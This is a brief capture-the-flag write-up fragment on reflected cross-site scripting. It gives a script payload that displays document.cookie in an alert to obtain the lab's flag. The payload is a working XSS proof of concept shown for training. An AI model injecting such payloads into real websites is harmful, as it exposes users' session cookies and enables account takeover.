# [Reflected XSS](Reflected%20XSS.md)
### To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

```html
'<script>alert(document.cookie)</script>'
```
![](Screenshot%202026-06-26%20at%2012.00.15.png)
